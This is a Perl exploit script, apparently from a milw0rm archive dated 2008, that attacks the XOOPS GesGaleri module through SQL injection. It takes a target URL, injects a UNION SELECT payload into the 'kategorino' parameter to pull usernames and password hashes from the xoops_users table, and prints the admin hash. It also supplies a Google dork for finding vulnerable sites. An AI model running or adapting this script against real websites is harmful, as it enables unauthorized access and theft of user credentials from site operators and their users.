#!/usr/bin/perl -w
 
 
#Xoops GesGaleri Sql injection#
########################################
#[~] Author :  EcHoLL
#[~] www.warezturk.org www.tahribat.com
#[~] Greetz : Black_label TURK Godlike
 
#[!] Module_Name:  GesGaleri
#[!] Script_Name:  XOOPS
#[!] Google_Dork:  inurl:"/modules/GesGaleri/"
########################################
 
 
system("color FF0000");
system("Nohacking");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|                 Turkish Securtiy Team                      |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|XOOPS Module GesGaleri(index.php kategorino)Remote SQL Injection Vuln|\n\n";
print "\t\t|   Coded by: EcHoLL     www.warezturk.org               |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
 
use LWP::UserAgent;
 
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
 chomp(my $target=<STDIN>);
 
$column_name="concat(uname,0x3a,pass)";
$table_name="xoops_users";
 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
 
$host = $target .   "/modules/GesGaleri/index.php?kategorino=5&no=15+union+select+1,2,".$column_name."+from/**/".$table_name."--";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
  print "\n[+] Admin Hash : $1\n\n";
  print "#   Tebrikler Exploit Calisti!  #\n\n";
}
else{print "\n[-] Exploit BulunamadÄ±...\n";
} 

# milw0rm.com [2008-10-18]
